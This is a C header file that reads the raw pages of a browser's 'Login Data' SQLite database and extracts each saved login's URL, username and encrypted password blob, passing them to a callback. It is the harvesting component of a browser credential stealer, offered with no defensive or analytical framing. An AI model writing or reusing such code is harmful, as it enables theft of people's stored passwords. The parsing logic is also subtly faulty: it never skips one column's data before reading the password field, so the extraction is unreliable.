// Minimal SQLite reader - only reads what we need from Login Data
#pragma once
#include <windows.h>

#pragma pack(push, 1)
struct SQLiteHeader {
    char magic[16];
    unsigned short page_size;
    unsigned char file_format_write;
    unsigned char file_format_read;
    unsigned char reserved_space;
    unsigned char max_payload_frac;
    unsigned char min_payload_frac;
    unsigned char leaf_payload_frac;
    unsigned int file_change_counter;
    unsigned int database_size;
    unsigned int first_freelist_page;
    unsigned int freelist_pages;
    unsigned int schema_cookie;
    unsigned int schema_format;
    unsigned int default_cache_size;
    unsigned int largest_root_page;
    unsigned int text_encoding;
    unsigned int user_version;
    unsigned int incremental_vacuum;
    unsigned int application_id;
    unsigned char reserved[20];
    unsigned int version_valid_for;
    unsigned int sqlite_version;
};
#pragma pack(pop)

// Read SQLite page
static unsigned char* read_page(HANDLE hFile, int page_num, int page_size) {
    unsigned char* buffer = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, page_size);
    if (!buffer) return NULL;
    
    LARGE_INTEGER offset;
    offset.QuadPart = (LONGLONG)(page_num - 1) * page_size;
    
    if (SetFilePointerEx(hFile, offset, NULL, FILE_BEGIN)) {
        DWORD read;
        if (ReadFile(hFile, buffer, page_size, &read, NULL) && read == page_size) {
            return buffer;
        }
    }
    
    HeapFree(GetProcessHeap(), 0, buffer);
    return NULL;
}

// Parse varint (variable-length integer used in SQLite)
static int parse_varint(const unsigned char* data, unsigned __int64* value) {
    *value = 0;
    int i;
    for (i = 0; i < 8; i++) {
        *value = (*value << 7) | (data[i] & 0x7F);
        if ((data[i] & 0x80) == 0) {
            return i + 1;
        }
    }
    *value = (*value << 8) | data[8];
    return 9;
}

// Callback for each password record found
typedef void (*PasswordCallback)(const char* url, int url_len, 
                                  const char* username, int username_len,
                                  const unsigned char* password_value, int password_len,
                                  void* user_data);

// Scan SQLite database for password records
static int scan_sqlite_passwords(HANDLE hFile, PasswordCallback callback, void* user_data) {
    SQLiteHeader header;
    DWORD read;
    
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    if (!ReadFile(hFile, &header, sizeof(header), &read, NULL) || read != sizeof(header)) {
        return 0;
    }
    
    // Verify SQLite magic
    if (header.magic[0] != 'S' || header.magic[1] != 'Q' || header.magic[2] != 'L') {
        return 0;
    }
    
    int page_size = (header.page_size == 1) ? 65536 : header.page_size;
    int count = 0;
    
    // Scan all pages looking for password data
    // In Login Data, passwords are stored in the "logins" table
    // We'll do a simple scan for the pattern: URL, username, password_value
    // Limit to 1000 pages to prevent excessive scanning on very large databases
    for (int page_num = 1; page_num <= header.database_size && page_num < 1000; page_num++) {
        unsigned char* page = read_page(hFile, page_num, page_size);
        if (!page) continue;
        
        // Look for table leaf pages (type 0x0D)
        if (page[0] == 0x0D) {
            int cell_count = (page[3] << 8) | page[4];
            int offset = (page_num == 1) ? 100 : 8; // Skip header on first page
            
            // Limit cells to prevent excessive parsing (Login Data typically has <20 cells per page)
            for (int cell = 0; cell < cell_count && cell < 100; cell++) {
                int cell_offset = (page[offset + cell * 2] << 8) | page[offset + cell * 2 + 1];
                // Reserve 100 bytes at end of page for safety margin
                if (cell_offset < page_size - 100) {
                    unsigned char* cell_ptr = page + cell_offset;
                    
                    // Parse cell - look for text fields that look like URLs
                    // Simplified: just look for "http" pattern in data
                    unsigned __int64 payload_size;
                    int varint_len = parse_varint(cell_ptr, &payload_size);
                    cell_ptr += varint_len;
                    
                    // Skip rowid
                    unsigned __int64 rowid;
                    varint_len = parse_varint(cell_ptr, &rowid);
                    cell_ptr += varint_len;
                    
                    // Parse record header
                    unsigned __int64 header_size;
                    varint_len = parse_varint(cell_ptr, &header_size);
                    unsigned char* record_start = cell_ptr;
                    cell_ptr += varint_len;
                    
                    // Read column types
                    unsigned __int64 col_types[20];
                    int num_cols = 0;
                    unsigned char* header_end = record_start + header_size;
                    
                    while (cell_ptr < header_end && num_cols < 20) {
                        varint_len = parse_varint(cell_ptr, &col_types[num_cols]);
                        cell_ptr += varint_len;
                        num_cols++;
                    }
                    
                    // Now cell_ptr points to data
                    // Look for pattern: text (URL), text (username), blob (password)
                    if (num_cols >= 3) {
                        unsigned char* data_ptr = cell_ptr;
                        const char* url = NULL;
                        int url_len = 0;
                        const char* username = NULL;
                        int username_len = 0;
                        const unsigned char* password = NULL;
                        int password_len = 0;
                        
                        // Column 1: origin_url
                        if (col_types[0] >= 13 && col_types[0] % 2 == 1) {
                            url_len = (int)(col_types[0] - 13) / 2;
                            url = (const char*)data_ptr;
                            data_ptr += url_len;
                        }
                        
                        // Skip to username_value (usually column 3)
                        for (int i = 1; i < 3 && i < num_cols; i++) {
                            if (col_types[i] == 0) continue;
                            if (col_types[i] >= 13 && col_types[i] % 2 == 1) {
                                int len = (int)(col_types[i] - 13) / 2;
                                data_ptr += len;
                            } else if (col_types[i] >= 12 && col_types[i] % 2 == 0) {
                                int len = (int)(col_types[i] - 12) / 2;
                                data_ptr += len;
                            }
                        }
                        
                        // Column 3: username_value
                        if (num_cols > 3 && col_types[3] >= 13 && col_types[3] % 2 == 1) {
                            username_len = (int)(col_types[3] - 13) / 2;
                            username = (const char*)data_ptr;
                            data_ptr += username_len;
                        }
                        
                        // Column 5: password_value (blob)
                        if (num_cols > 5 && col_types[5] >= 12 && col_types[5] % 2 == 0) {
                            password_len = (int)(col_types[5] - 12) / 2;
                            password = data_ptr;
                            data_ptr += password_len;
                        }
                        
                        // If we found URL starting with http and a password blob, callback
                        if (url && url_len > 4 && password && password_len > 15 &&
                            url[0] == 'h' && url[1] == 't' && url[2] == 't' && url[3] == 'p') {
                            callback(url, url_len, username, username_len, password, password_len, user_data);
                            count++;
                        }
                    }
                }
            }
        }
        
        HeapFree(GetProcessHeap(), 0, page);
    }
    
    return count;
}
